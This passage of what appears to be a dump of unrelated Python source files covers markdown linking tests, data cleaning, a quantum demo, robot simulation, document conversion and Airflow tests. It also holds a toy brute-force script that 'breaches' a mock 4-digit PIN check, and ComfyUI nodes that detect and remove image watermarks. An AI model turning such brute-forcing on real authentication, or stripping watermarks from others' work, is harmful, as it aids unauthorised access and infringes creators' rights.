self.assertIn(\"This [[README]] does not mention any programming languages.\", content)\n    \n    def test_link_pattern(self):\n        self.create_file(self.file1_path, \"This is a file about object-oriented programming.\")\n        self.create_file(self.file3_path, \"This README mentions object-oriented programming, but not object oriented programming.\")\n\n        markdown_files = find_markdown_files(self.temp_dir.name)\n        edited_files, total_links_added = link_files(markdown_files)\n\n        with open(self.file3_path, 'r', encoding='utf-8') as f:\n            content = f.read()\n            self.assertIn(\"[[object-oriented programming]]\", content)\n            self.assertNotIn(\"[[Object Oriented Programming]]\", content)\n        self.assertIn(self.file3_path, edited_files)  # Verify the file was edited\n\n    def test_wiki_link_pattern(self):\n        self.create_file(self.file1_path, \"This is a file about object-oriented programming.\")\n        self.create_file(self.file3_path, \"This README mentions object-oriented programming, but not object oriented programming.\")\n\n        markdown_files = find_markdown_files(self.temp_dir.name)\n        edited_files, total_links_added = link_files(markdown_files)\n\n        with open(self.file3_path, 'r', encoding='utf-8') as f:\n            content = f.read()\n            self.assertIn(\"[[object-oriented programming]]\", content)\n            self.assertNotIn(\"[[Object Oriented Programming]]\", content)\n        self.assertIn(self.file3_path, edited_files)\n\n    def test_complex_linking(self):\n        self.create_file(self.file1_path, \"This is a file about object-oriented programming.\")\n        self.create_file(self.file2_path, \"This is a file about functional programming.\")\n        self.create_file(self.file4_path, \"This is a file about objects.\")\n        self.create_file(self.file3_path, \"This README mentions object-oriented programming, func",
    "import pandas as pd\nimport requests\nimport re\n\n# import eter-export-2021-FR.xlsx\ndf = pd.read_excel('eter-export-2021-IT.xlsx')\n\n# Replace column 'ETER ID' column\ndf.rename(columns={'ETER ID': 'ETER_ID'}, inplace=True)\n\n# Replace column 'Institution Name' column\ndf.rename(columns={'Institution Name': 'Name'}, inplace=True)\n\n# Replace column 'Legal status' column\ndf.rename(columns={'Legal status': 'Category'}, inplace=True)\n\n# Replace column 'Institutional website' column\ndf.rename(columns={'Institutional website': 'Url'}, inplace=True)\n\n# Replace column 'Institution Category standardized' column\ndf.rename(columns={'Institution Category standardized': 'Institution_Category_Standardized'}, inplace=True)\n\n# Replace column 'Member of European University alliance' column\ndf.rename(columns={'Member of European University alliance': 'Member_of_European_University_alliance'}, inplace=True)\n\n# Replace column 'Region of establishment (NUTS 2)' column\ndf.rename(columns={'Region of establishment (NUTS 2)': 'NUTS2'}, inplace=True)\n\n# Replace column 'Region of establishment (NUTS 3)' column\ndf.rename(columns={'Region of establishment (NUTS 3)': 'NUTS3'}, inplace=True)\n\n# Replace values \u200b\u200bin 'category' column\n# OBS: government dependent we will assume as public\ncategory_replaces = {0: 'public', 1: 'private', 2: 'public'}\ndf['Category'] = df['Category'].replace(category_replaces)\n\n# Replace the values \u200b\u200bin the 'Institution Category standardized' column\ninstitutions_category_replaces = {0: 'Other', 1: 'University', 2: 'University of applied sciences'}\ndf['Institution_Category_Standardized'] = df['Institution_Category_Standardized'].replace(institutions_category_replaces)\n\n# Replace the value in the 'Member of European University alliance' column\nmember_of_European_University_alliance_replaces = {0: 'No', 1: 'Yes'}\n\ndf['Member_of_European_University_alliance'] = df['Member_of_European_University_alliance'].replace(member_of_European_University_alliance_replaces)\n\n# Remove White spaces\ndf['Url'] = df['Url'].str.strip()\n\n# Remove the http and https from url\ndf['Url'] = df['Url'].str.replace(r'^https?://', '', regex=True)\n\n# Remove the third bar from the url\ndf['Url'] = df['Url'].str.replace(r'/.*', '', regex=True)\n\n\n# Import NUTS2013-NUTS2016.xlsx and select the right sheet\n# Source: https://ec.europa.eu/eurostat/documents/345175/629341/NUTS2013-NUTS2016.xlsx\n# Import NUTS2013-NUTS2016.xlsx and select the right sheet\ndfNuts16Raw = pd.read_excel('NUTS2013-NUTS2016.xlsx', sheet_name='NUTS2013-NUTS2016', header=1)\n\n# Create NUTS2 mapping DataFrame for 2016\ndfNuts2_2016 = dfNuts16Raw[['Code 2016', 'NUTS level 2']].copy()\ndfNuts2_2016.rename(columns={\n    'Code 2016': 'NUTS2',\n    'NUTS level 2': 'NUTS2_Label_2016'\n}, inplace=True)\n\n# Create NUTS3 mapping DataFrame for 2016\ndfNuts3_2016 = dfNuts16Raw[['Code 2016', 'NUTS level 3']].copy()\ndfNuts3_2016.rename(columns={\n    'Code 2016': 'NUTS3',\n    'NUTS level 3': 'NUTS3_Label_2016'\n}, inplace=True)\n\n# Merge df with NUTS2 and NUTS3 for 2016\ndf = pd.merge(df, dfNuts2_2016, on='NUTS2', how='left')\ndf = pd.merge(df, dfNuts3_2016, on='NUTS3', how='left')\n\n# Import NUTS2021.xlsx\ndfNuts21Raw = pd.read_excel('NUTS2021.xlsx', sheet_name='NUTS & SR 2021')\n\n# Create NUTS2 mapping DataFrame for 2021\ndfNuts2_2021 = dfNuts21Raw[['Code 2021', 'NUTS level 2']].copy()\ndfNuts2_2021.rename(columns={\n    'Code 2021': 'NUTS2',\n    'NUTS level 2': 'NUTS2_Label_2021'\n}, inplace=True)\n\n# Create NUTS3 mapping DataFrame for 2021\ndfNuts3_2021 = dfNuts21Raw[['Code 2021', 'NUTS level 3']].copy()\ndfNuts3_2021.rename(columns={\n    'Code 2021': 'NUTS3',\n    'NUTS level 3': 'NUTS3_Label_2021'\n}, inplace=True)\n\n# Merge df with NUTS2 and NUTS3 for 2021\ndf = pd.merge(df, dfNuts2_2021, on='NUTS2', how='left')\ndf = pd.merge(df, dfNuts3_2021, on='NUTS3', how='left')\n\n# Arrange NUTS related columns in desired order\nnuts_columns = [\n    'NUTS2', 'NUTS2_Label_2016', 'NUTS2_Label_2021',\n    'NUTS3', 'NUTS3_Label_2016', 'NUTS3_Label_2021'\n]\n\n# Find columns that already exist in the DataFrame\nexisting_nuts_columns = [col for col in nuts_columns if col in df.columns]\n\n# Determine the position where NUTS columns should be inserted (after 'Url')\ninsertion_point = df.columns.get_loc('Url') + 1\n\n# Get remaining columns without duplicating or changing original order\nremaining_columns = [col for col in df.columns if col not in existing_nuts_columns]\n\n# Insert NUTS columns in desired position\nnew_column_order = (\n    remaining_columns[:insertion_point]\n    + existing_nuts_columns\n    + remaining_columns[insertion_point:]\n)\n\n# Reorganize DataFrame with new column order\ndf = df[new_column_order]\n\n  # verifiy duplicate url\n\ndef check_duplicates_url(df, coluna_url='Url'):\n    def extract_domain_without_www(url):\n        try:\n            url = re.sub(r'www\\.', '', url)\n            domain = url.split('/')[0]\n            return domain\n        except:\n            return None\n\n    df['domain_without_www'] = df[coluna_url].apply(extract_domain_",
    "\nfrom typing import Tuple, Dict\nfrom qiskit import QuantumCircuit, execute\nfrom qiskit_aer import AerSimulator\nimport sys\nimport os\n\nsys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))\nfrom src.oracle import create_oracle, verify_oracle\n\ndef deutsch_jozsa_algorithm(\n    n: int, \n    function_type: str = \"balanced\",\n    shots: int = 1024,\n    simulator = None\n) -> Tuple[QuantumCircuit, Dict[str, int]]:\n    \"\"\"\n    Implements Deutsch-Jozsa quantum algorithm.\n    \"\"\"\n    if n <= 0 or shots <= 0:\n        raise ValueError(\"Invalid input parameters\")\n\n    # Create circuit\n    qc = QuantumCircuit(n + 1, n)\n    \n    # Initialize\n    qc.x(n)\n    qc.h(range(n + 1))\n    \n    # Apply oracle\n    oracle = create_oracle(n, function_type)\n    qc.compose(oracle, inplace=True)\n    \n    # Final Hadamard gates\n    qc.h(range(n))\n    \n    # Measure\n    qc.measure(range(n), range(n))\n    \n    # Execute with optimized simulator initialization\n    if simulator is None:\n        simulator = AerSimulator()\n    job = execute(qc, simulator, shots=shots)\n    counts = job.result().get_counts()\n    \n    return qc, counts\n\ndef analyze_results(counts: Dict[str, int], function_type: str, n: int) -> str:\n    \"\"\"\n    Analyzes results of Deutsch-Jozsa algorithm.\n    \"\"\"\n    zero_state = '0' * n\n    total_shots = sum(counts.values())\n    \n    if function_type == \"constant\":\n        if counts.get(zero_state, 0) > 0.9 * total_shots:\n            return (\n                \"Function is CONSTANT-0:\\n\"\n                f\"- High probability in |{zero_state}\u27e9 state ({counts[zero_state]/total_shots:.2%})\\n\"\n                \"- Classical: requires 2^n queries\\n\"\n                \"- Quantum: solved in 1 query\"\n            )\n        return (\n            \"Function is CONSTANT-1:\\n\"\n            \"- No measurements in |0...0\u27e9 state\\n\"\n            \"- Classical: requires 2^n queries\\n\"\n            \"- Quantum: solved in 1 query\"\n        )\n    else:\n        if zero_state not in counts:\n            return (\n                \"Function is BALANCED:\\n\"\n                \"- No measurements in |0...0\u27e9 state\\n\"\n                \"- Equal 0s and 1s in output\\n\"\n                f\"- Classical: requires {2**(n-1)+1} queries minimum\\n\"\n                \"- Quantum: solved in 1 query\"\n            )\n        return \"Unexpected result for balanced function\"\n\nif __name__ == \"__main__\":\n    n_qubits = 3\n    function_types = [\"constant\", \"balanced\"]\n    \n    for f_type in function_types:\n        try:\n            print(f\"\\n{'='*50}\")\n            print(f\"Deutsch-Jozsa Algorithm: {f_type.upper()} Function Test\")\n            print('='*50)\n            \n            # Run algorithm\n            circuit, counts = deutsch_jozsa_algorithm(n_qubits, f_type)\n            print(f\"\\nCircuit depth: {circuit.depth()}\")\n            print(\"Measurement distribution:\")\n            for state, count in counts.items():\n                print(f\"|{state}\u27e9: {count/1024:.2%}\")\n            \n            # Show oracle behavior\n            oracle = create_oracle(n_qubits, f_type)\n            results = verify_oracle(oracle, n_qubits)\n            \n            print(\"\\nOracle Function Pattern:\")\n            print(\"-\" * 20)\n            for input_state, output in sorted(results.items()):\n                print(f\"f(|{input_state}\u27e9) = |{int(output)}\u27e9\")\n            \n            print(\"\\nAlgorithm Analysis:\")\n            print(\"-\" * 20)\n            print(analyze_results(counts, f_type, n_qubits))\n            \n        except Exception as e:\n            print(f\"Error: {str(e)}\")",
    "def one2ten():\n    i = 1\n    while i != 11:\n        print(i)\n        i = i+1\n\n    print(\"x---------------------------------------------------------------------------------x\")\n\n    return 0\n\ndef one2hundred():\n    i = 1\n    while i != 101:\n        print(i)\n        i = i+1\n\n    print(\"x---------------------------------------------------------------------------------x\")\n\n    return 0\n\ndef one2thousand():\n    i = 1\n    while i != 1_001:\n        print(i)\n        i = i+1\n\n    print(\"x---------------------------------------------------------------------------------x\")\n\n    return 0\n\ndef one2million():\n    i = 1\n    while i != 1_000_001:\n        print(i)\n        i = i+1\n\n    print(\"x---------------------------------------------------------------------------------x\")\n\n    return 0\n\ndef one2billion():\n    i = 1\n    while i != 1_000_000_001:\n        print(i)\n        i = i+1\n\n    print(\"x---------------------------------------------------------------------------------x\")\n\n    return 0\n\ndef one2trillion():\n    i = 1\n    while i != 1_000_000_000_001:\n        print(i)\n        i = i+1\n\n    print(\"x---------------------------------------------------------------------------------x\")\n\n    return 0\n\ndef one2about():\n    print(\"This module can print one to ten, one to hundred, one to thousand, one to million, one to billion, one to trillion.\")\n    print(\"If you want to see guide use `one2usage()` function.\")\n    print(\"This module `one2` is created by Hadi Raza and was officially completed on 1 Jan 2025.\")\n    print(\"Email: `hadiraza.9002@gmail.com`\")\n    print(\"     \")\n\ndef one2guide():\n    print(\"Caution: Be careful while using it because larger numbers like million, billion, or trillion can crash, or hang your PC.\")\n    print(\"Use `one2ten()` fuction to print 1 to 10.\")\n    print(\"Use `one2hundred()` fuction to print 1 to 100.\")\n    print(\"Use `one2thousnd()` fuction to print 1 to 1,000.\")\n    print(\"Use `one2million()` fuction to print 1 to 1,000,000.\")\n    print(\"Use `one2billion()` fuction to print 1 to 1,000,000,000.\")\n    print(\"Use `one2trillion()` fuction to print 1 to 1,000,000,000,000.\")\n    print(\"Use `one2about` fuction to print about thi module.\")\n    print(\"Use `one2guide` fuction to see this guide.\")\n    print(\"    \")\n\n",
    "\"\"\"\r\nWrite a Python script to breach a fictional secure system by guessing a 4-digit PIN code. The PIN code will be randomly generated, and you'll need to use a brute-force approach to crack it.\r\n\r\nConstraints:\r\n\r\n1. The PIN code consists of 4 digits (0-9).\r\n2. The script should iterate through all possible combinations (0000-9999) to guess the correct PIN.\r\n3. When the correct PIN is guessed, the script should exit and display the correct PIN.\r\n\r\nMock System Response:\r\n\r\nTo simulate the secure system, I'll respond to your script's attempts with either \"ACCESS DENIED\" (if the PIN is incorrect) or \"SYSTEM BREACHED\" (if the PIN is correct).\r\n\"\"\"\r\n\r\nimport random\r\n\r\n# Mock system setup: Randomly generate a 4-digit PIN code\r\nactual_pin = f\"{random.randint(0, 9999):04d}\"\r\n\r\ndef attempt_pin(guess):\r\n    \"\"\"\r\n    Simulates the system response to a PIN guess.\r\n    Returns \"ACCESS DENIED\" if the guess is incorrect,\r\n    and \"SYSTEM BREACHED\" if the guess is correct.\r\n    \"\"\"\r\n    if guess == actual_pin:\r\n        return \"SYSTEM BREACHED\"\r\n    else:\r\n        return \"ACCESS DENIED\"\r\n\r\n# Brute-force attack: Try all possible 4-digit PINs\r\nfor pin in range(10000):  # 0000 to 9999\r\n    guess = f\"{pin:04d}\"  # Format the PIN as a 4-digit string\r\n    response = attempt_pin(guess)\r\n    print(f\"Trying PIN: {guess} - {response}\")\r\n    \r\n    if response == \"SYSTEM BREACHED\":\r\n        print(f\"Correct PIN found: {guess}\")\r\n        break\r\n    \r\n\"\"\"\r\nactual_pin = f\"{random.randint(0, 9999):04d}\" \r\n04d --- what is it???\r\n\r\n\r\nThe 04d is a formatting directive in Python's f-string that is used to format numbers. Here's what it does:\r\n\r\n0: Pads the number with leading zeros if it's shorter than 4 digits.\r\n4: Ensures that the output will be 4 characters long.\r\nd: Stands for \"decimal integer,\" meaning the number will be treated as an integer and displayed as a base-10 number.\r\nIn this context, f\"{random.randint(0, 9999):04d}\" does the following:\r\n\r\nrandom.randint(0, 9999): Generates a random integer between 0 and 9999.\r\n:04d: Formats the number to ensure it is exactly 4 digits long, padding with leading zeros if necessary.\r\nFor example:\r\n\r\nIf the random number is 42, it will be formatted as \"0042\".\r\nIf the random number is 7, it will be formatted as \"0007\".\r\nIf the random number is 1234, it will remain \"1234\".\r\nThis ensures that all PIN codes are exactly 4 digits long, which is important for consistency in your brute-force script.\r\n\r\n\"\"\"",
    "import logging\nimport subprocess\nfrom pathlib import Path\nfrom .exceptions import LibreOfficeNotFoundError, ConversionError\n\nlogger = logging.getLogger(__name__)\n\ndef convert_pptx_to_pdf(input_file: Path, libreoffice_path: Path, temp_dir: Path) -> Path:\n    \"\"\"\n    Convert a PowerPoint file to PDF using LibreOffice.\n    \n    :param input_file: Path to the input PowerPoint file\n    :param libreoffice_path: Path to LibreOffice executable\n    :param temp_dir: Temporary directory to store the PDF\n    :return: Path to the output PDF file if successful\n    :raises LibreOfficeNotFoundError: if LibreOffice is not found\n    :raises ConversionError: if the conversion fails\n    \"\"\"\n    if not libreoffice_path.exists():\n        logger.error(f\"LibreOffice not found at {libreoffice_path}\")\n        raise LibreOfficeNotFoundError(f\"LibreOffice not found at {libreoffice_path}\")\n\n    try:\n        cmd = [\n            str(libreoffice_path),\n            '--headless',\n            '--convert-to', 'pdf',\n            '--outdir', str(temp_dir),\n            str(input_file)\n        ]\n        \n        result = subprocess.run(cmd, check=True, capture_output=True, text=True)\n        logger.debug(f\"LibreOffice conversion output: {result.stdout}\")\n\n        # The PDF file name should match the PPTX name, but with \".pdf\"\n        pdf_name = f\"{input_file.stem}.pdf\"\n        pdf_path = temp_dir / pdf_name\n        \n        if pdf_path.exists():\n            return pdf_path\n        else:\n            logger.error(f\"Expected PDF not created at {pdf_path}\")\n            logger.error(f\"LibreOffice error: {result.stderr}\")\n            raise ConversionError(f\"Failed to create PDF at {pdf_path}\")\n\n    except subprocess.CalledProcessError as e:\n        logger.error(f\"Error converting {input_file}: {e.stderr}\")\n        raise ConversionError(f\"Subprocess conversion error: {e.stderr}\")\n    except Exception as e:\n        logger.error(f\"Unexpected error converting {input_file}: {str(e)}\")\n        raise ConversionError(f\"Unexpected error: {str(e)}\")\n",
    "# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.  \n# SPDX-License-Identifier: CC-BY-NC-4.0\nfrom typing import Optional, Union\nfrom transformers import PretrainedConfig\n\n\nclass LcPlmConfig(PretrainedConfig):\n    \"\"\"Config that extends the original MambaConfig with params relevant to bi-directionality.\"\"\"\n    model_type = \"lc_plm\"\n\n    def __init__(\n            self,\n            # From original MambaConfig\n            d_model: int = 1536,\n            d_intermediate: int = 0,\n            n_layer: int = 48,\n            vocab_size: int = 33,\n            ssm_cfg: Optional[dict] = None,\n            attn_layer_idx = None,\n            attn_cfg = None,\n            norm_epsilon: float = 1e-5,\n            rms_norm: bool = True,\n            residual_in_fp32: bool = True,\n            fused_add_norm: bool = True,\n            pad_vocab_size_multiple: int = 8,\n            layer: str = \"Mamba2\",\n\n            # Used in init_weights\n            initializer_cfg: Optional[dict] = None,\n\n            # BiMamba-specific params\n            bidirectional: bool = True,\n            bidirectional_strategy: Union[str, None] = \"add\",\n            bidirectional_weight_tie: bool = True,\n            tie_embeddings: bool = True,\n            pad_token_id: int = -100,\n            **kwargs,\n    ):\n        super().__init__(**kwargs)\n        self.d_model = d_model\n        self.d_intermediate = d_intermediate\n        self.n_layer = n_layer\n        self.vocab_size = vocab_size\n        self.ssm_cfg = ssm_cfg\n        self.attn_layer_idx = attn_layer_idx\n        self.attn_cfg = attn_cfg\n        self.rms_norm = rms_norm\n        self.residual_in_fp32 = residual_in_fp32\n        self.fused_add_norm = fused_add_norm\n        self.pad_vocab_size_multiple = pad_vocab_size_multiple\n        self.norm_epsilon = norm_epsilon\n        self.layer = layer\n        self.initializer_cfg = initializer_cfg\n        self.bidirectional = bidirectional\n        self.bidirectional_strategy = bidirectional_strategy\n        self.bidirectional_weight_tie = bidirectional_weight_tie\n        self.tie_embeddings = tie_embeddings\n        self.pad_token_id = pad_token_id\n",
    "\"\"\"\nCopyright (c) 2020, NVIDIA CORPORATION. All rights reserved.\n\nNVIDIA CORPORATION and its licensors retain all intellectual property\nand proprietary rights in and to this software, related documentation\nand any modifications thereto. Any use, reproduction, disclosure or\ndistribution of this software and related documentation without an express\nlicense agreement from NVIDIA CORPORATION is strictly prohibited.\n\n\nFranka Attractor\n----------------\nPositional control of franka panda robot with a target attractor that the robot tries to reach\n\"\"\"\n\nimport math\nimport time\n\nimport numpy as np\nfrom isaacgym import gymapi, gymtorch, gymutil\n\nn_envs = 1\nn_envs = 512\n# n_envs = 1024\n# n_envs = 2048\n# n_envs = 4096\n# n_envs = 8192\n# n_envs = 16384\n# n_envs = 32768\n\nvis = False\n# vis = True\n\nself_collision = True\n# self_collision = False\n\nfree_drop = False\n# free_drop = True\n\n\nimport torch\n\n# Initialize gym\ngym = gymapi.acquire_gym()\n\n# Parse arguments\nargs = gymutil.parse_arguments(description=\"Franka Attractor Example\")\n# configure sim\nsim_params = gymapi.SimParams()\nsim_params.dt = 0.01\nsim_params.substeps = 1\nif args.physics_engine == gymapi.SIM_FLEX:\n    sim_params.flex.solver_type = 5\n    sim_params.flex.num_outer_iterations = 4\n    sim_params.flex.num_inner_iterations = 15\n    sim_params.flex.relaxation = 0.75\n    sim_params.flex.warm_start = 0.8\nelif args.physics_engine == gymapi.SIM_PHYSX:\n    sim_params.physx.solver_type = 1\n    sim_params.physx.num_position_iterations = 4\n    sim_params.physx.num_velocity_iterations = 1\n    sim_params.physx.num_threads = args.num_threads\n    sim_params.physx.use_gpu = args.use_gpu\n\nsim_params.use_gpu_pipeline = True\nif not vis:\n    args.graphics_device_id = -1\nsim = gym.create_sim(args.compute_device_id, args.graphics_device_id, args.physics_engine, sim_params)\n\nif sim is None:\n    print(\"*** Failed to create sim\")\n    quit()\n\nif vis:\n    # Create viewer\n    viewer = gym.create_viewer(sim, gymapi.CameraProperties())\n    if viewer is None:\n        print(\"*** Failed to create viewer\")\n        quit()\n\n# Add ground plane\nplane_params = gymapi.PlaneParams()\ngym.add_ground(sim, plane_params)\n\n# Load franka asset\nasset_root = \"../../assets\"\nfranka_asset_file = \"urdf/franka_description/robots/franka_panda.urdf\"\n\nasset_options = gymapi.AssetOptions()\nasset_options.fix_base_link = True\nasset_options.flip_visual_attachments = True\nasset_options.armature = 0.01\n\nprint(\"Loading asset '%s' from '%s'\" % (franka_asset_file, asset_root))\nfranka_asset = gym.load_asset(\n    sim, asset_root, franka_asset_file, asset_options)\n\n# Set up the env grid\nspacing = 1.0\nenv_lower = gymapi.Vec3(-spacing, 0.0, -spacing)\nenv_upper = gymapi.Vec3(spacing, spacing, spacing)\n\n# Some common handles for later use\npose = gymapi.Transform()\npose.p = gymapi.Vec3(0, 0.0, 0.0)\npose.r = gymapi.Quat(-0.707107, 0.0, 0.0, 0.707107)\n\n\nprint(\"Creating %d environments\" % n_envs)\nnum_per_row = int(math.sqrt(n_envs))\nenvs = []\nfranka_handles = []\nfor i in range(n_envs):\n    # create env\n    env = gym.create_env(sim, env_lower, env_upper, num_per_row)\n    envs.append(env)\n\n    # add franka\n    franka_handle = gym.create_actor(env, franka_asset, pose, \"franka\", i, 0 if self_collision else 2)\n\n    franka_handles.append(franka_handle)\n\nif vis:\n    # Point camera at environments\n    cam_pos = gymapi.Vec3(-4.0, 4.0, -1.0)\n    cam_target = gymapi.Vec3(0.0, 2.0, 1.0)\n\n    gym.viewer_camera_look_at(viewer, None, cam_pos, cam_target)\n\ngym.prepare_sim(sim)\n\ndef step():\n    # Step the physics\n    gym.simulate(sim)\n    gym.fetch_results(sim, True)\n\n    # Step rendering\n    if vis:\n        gym.step_graphics(sim)\n        gym.draw_viewer(viewer, sim, False)\n        gym.sync_frame_time(sim)\n\nif free_drop:\n    # warmup\n    for i in range(200):\n        step()\n\n    gym.refresh_dof_state_tensor(sim)\n    # get joint limits and ranges for Franka\n    franka_dof_props = gym.get_actor_dof_properties(envs[0], franka_handles[0])\n    # override default stiffness and damping values\n    franka_dof_props['stiffness'].fill(1000.0)\n    franka_dof_props['damping'].fill(1000.0)\n\n    # Give a desired pose for first 2 robot joints to improve stability\n    franka_dof_props[\"driveMode\"][0:2] = gymapi.DOF_MODE_POS\n    franka_dof_props[\"driveMode\"][7:] = gymapi.DOF_MODE_POS\n    franka_dof_props['stiffness'][7:] = 1e10\n    franka_dof_props['damping'][7:] = 1.0\n\n    for i in range(n_envs):\n        gym.set_actor_dof_properties(envs[i], franka_handles[i], franka_dof_props)\n\n    _dof_states = gym.acquire_dof_state_tensor(sim)\n    dof_states = gymtorch.wrap_tensor(_dof_states)\n    dof_pos = dof_states[:, 0].view(n_envs, 9)\n\nelse:\n\n    gym.refresh_dof_state_tensor(sim)\n    # get joint limits and ranges for Franka\n    franka_dof_props = gym.get_actor_dof_properties(envs[0], franka_handles[0])\n    # override default stiffness and damping values\n    franka_dof_props['stiffness'].fill(1000.0)\n    franka_dof_props['damping'].fill(1000.0)\n\n    # Give a desired pose for first 2 r",
    "# nodes.py\n\nfrom . import find_watermarks\nimport torchvision.transforms as transforms\n\n# Define transforms for converting between PIL Images and Tensors\nto_tensor = transforms.ToTensor()\nto_pil = transforms.ToPILImage()\n\n# ------------------------------------------------------------------------------\n# Node 1: FindWatermarkNode\n# ------------------------------------------------------------------------------\nclass FindWatermarkNode:\n    \"\"\"\n    This node takes a batch of images and returns:\n      - The x and y coordinates of the detected watermark\n      - The watermark detection score as a string\n    \"\"\"\n\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\n                \"images\": (\"IMAGE\", ),  # Changed from \"TENSOR\" to \"IMAGE\"\n            }\n        }\n\n    RETURN_TYPES = (\"INT\", \"INT\", \"STRING\")\n    RETURN_NAMES = (\"x\", \"y\", \"score\")\n    FUNCTION = \"find_watermark\"\n    CATEGORY = \"Watermark Removal\"\n\n    def find_watermark(self, images):\n        \"\"\"\n        Args:\n            images (list of PIL.Image): Batch of input images.\n\n        Returns:\n            Tuple[int, int, str]: x-coordinate, y-coordinate, and detection score.\n        \"\"\"\n        # Call your existing watermark detection function\n        result = find_watermarks.find_watermark_tensor(images.permute(0, 3, 1, 2), result_cutoff=1.0)\n\n        if not result:\n            # If no watermark found, return default values\n            return (0, 0, \"Failed\")\n        \n        best_x, best_y, final_result = result\n        # Convert the numeric final_result to a string with formatting\n        return (best_x, best_y, f\"Chance of watermark: {final_result:.4f}\")\n\n\n# ------------------------------------------------------------------------------\n# Node 2: RemoveWatermarkNode\n# ------------------------------------------------------------------------------\nclass RemoveWatermarkNode:\n    \"\"\"\n    This node takes a batch of images and the (x, y) positions of the watermark, then removes it.\n    \"\"\"\n\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\n                \"images\": (\"IMAGE\", ), \n            },\n            \"optional\": {\n                \"x\": (\"INT\", {\"forceInput\":True}),\n                \"y\": (\"INT\", {\"forceInput\":True}),\n                \"score\": (\"STRING\", {\"forceInput\":True, \"default\": \"\"}),\n                \"nudge_x\": (\"INT\", {\"default\": 0, \"min\": -999999, \"max\": 999999, \"step\": 1}),\n                \"nudge_y\": (\"INT\", {\"default\": 0, \"min\": -999999, \"max\": 999999, \"step\": 1}),\n            }\n        }\n\n    RETURN_TYPES = (\"IMAGE\",)\n    RETURN_NAMES = (\"images_corrected\",)\n    FUNCTION = \"remove_watermark\"\n    CATEGORY = \"Watermark Removal\"\n\n    def remove_watermark(self, images, x=0, y=0, score=\"\", nudge_x=0, nudge_y=0):\n        \"\"\"\n        Args:\n            images (list of PIL.Image): Batch of input images.\n            x (int): x-coordinate of the watermark.\n            y (int): y-coordinate of the watermark.\n            score (string): lets the detector tell us if it failed\n            nudge_x (int): Additional x nudge value.\n            nudge_y (int): Additional y nudge value.\n\n        Returns:\n            Tuple[list of PIL.Image]: Batch of corrected images without the watermark.\n        \"\"\"\n        x += nudge_x\n        y += nudge_y\n\n        # Call your existing watermark removal function\n        if score != \"Failed\":\n            corrected_frames = find_watermarks.remove_watermark_batch(images.permute(0, 3, 1, 2), x, y)\n            images = corrected_frames.permute(0, 2, 3, 1)\n\n        return (images,)",
    "\"\"\"Test the validity of all DAGs. **USED BY DEV PARSE COMMAND DO NOT EDIT**\"\"\"\n\nfrom contextlib import contextmanager\nimport logging\nimport os\n\nimport pytest\n\nfrom airflow.models import DagBag, Variable, Connection\nfrom airflow.hooks.base import BaseHook\nfrom airflow.utils.db import initdb\n\n# init airflow database\ninitdb()\n\n# The following code patches errors caused by missing OS Variables, Airflow Connections, and Airflow Variables\n\n\n# =========== MONKEYPATCH BaseHook.get_connection() ===========\ndef basehook_get_connection_monkeypatch(key: str, *args, **kwargs):\n    print(\n        f\"Attempted to fetch connection during parse returning an empty Connection object for {key}\"\n    )\n    return Connection(key)\n\n\nBaseHook.get_connection = basehook_get_connection_monkeypatch\n# # =========== /MONKEYPATCH BASEHOOK.GET_CONNECTION() ===========\n\n\n# =========== MONKEYPATCH OS.GETENV() ===========\ndef os_getenv_monkeypatch(key: str, *args, **kwargs):\n    default = None\n    if args:\n        default = args[0]  # os.getenv should get at most 1 arg after the key\n    if kwargs:\n        default = kwargs.get(\n            \"default\", None\n        )  # and sometimes kwarg if people are using the sig\n\n    env_value = os.environ.get(key, None)\n\n    if env_value:\n        return env_value  # if the env_value is set, return it\n    if (\n        key == \"JENKINS_HOME\" and default is None\n    ):  # fix https://github.com/astronomer/astro-cli/issues/601\n        return None\n    if default:\n        return default  # otherwise return whatever default has been passed\n    return f\"MOCKED_{key.upper()}_VALUE\"  # if absolutely nothing has been passed - return the mocked value\n\n\nos.getenv = os_getenv_monkeypatch\n# # =========== /MONKEYPATCH OS.GETENV() ===========\n\n# =========== MONKEYPATCH VARIABLE.GET() ===========\n\n\nclass magic_dict(dict):\n    def __init__(self, *args, **kwargs):\n        self.update(*args, **kwargs)\n\n    def __getitem__(self, key):\n        return {}.get(key, \"MOCKED_KEY_VALUE\")\n\n\n_no_default = object()  # allow falsey defaults\n\n\ndef variable_get_monkeypatch(key: str, default_var=_no_default, deserialize_json=False):\n    print(\n        f\"Attempted to get Variable value during parse, returning a mocked value for {key}\"\n    )\n\n    if default_var is not _no_default:\n        return default_var\n    if deserialize_json:\n        return magic_dict()\n    return \"NON_DEFAULT_MOCKED_VARIABLE_VALUE\"\n\n\nVariable.get = variable_get_monkeypatch\n# # =========== /MONKEYPATCH VARIABLE.GET() ===========\n\n\n@contextmanager\ndef suppress_logging(namespace):\n    \"\"\"\n    Suppress logging within a specific namespace to keep tests \"clean\" during build\n    \"\"\"\n    logger = logging.getLogger(namespace)\n    old_value = logger.disabled\n    logger.disabled = True\n    try:\n        yield\n    finally:\n        logger.disabled = old_value\n\n\ndef get_import_errors():\n    \"\"\"\n    Generate a tuple for import errors in the dag bag, and include DAGs without errors.\n    \"\"\"\n    with suppress_logging(\"airflow\"):\n        dag_bag = DagBag(include_examples=False)\n\n        def strip_path_prefix(path):\n            return os.path.relpath(path, os.environ.get(\"AIRFLOW_HOME\"))\n\n        # Initialize an empty list to store the tuples\n        result = []\n\n        # Iterate over the items in import_errors\n        for k, v in dag_bag.import_errors.items():\n            result.append((strip_path_prefix(k), v.strip()))\n\n        # Check if there are DAGs without errors\n        for file_path in dag_bag.dags:\n            # Check if the file_path is not in import_errors, meaning no errors\n            if file_path not in dag_bag.import_errors:\n                result.append((strip_path_prefix(file_path), \"No import errors\"))\n\n        return result\n\n\n@pytest.mark.parametrize(\n    \"rel_path, rv\", get_import_errors(), ids=[x[0] for x in get_import_errors()]\n)\ndef test_file_imports(rel_path, rv):\n    \"\"\"Test for import errors on a file\"\"\"\n    if os.path.exists(\".astro/dag_integrity_exceptions.txt\"):\n        with open(\".astro/dag_integrity_exceptions.txt\", \"r\") as f:\n            exceptions = f.readlines()\n    print(f\"Exceptions: {exceptions}\")\n    if (rv != \"No import errors\") and rel_path not in exceptions:\n        # If rv is not \"No import errors,\" consider it a failed test\n        raise Exception(f\"{rel_path} failed to import with message \\n {rv}\")\n    else:\n        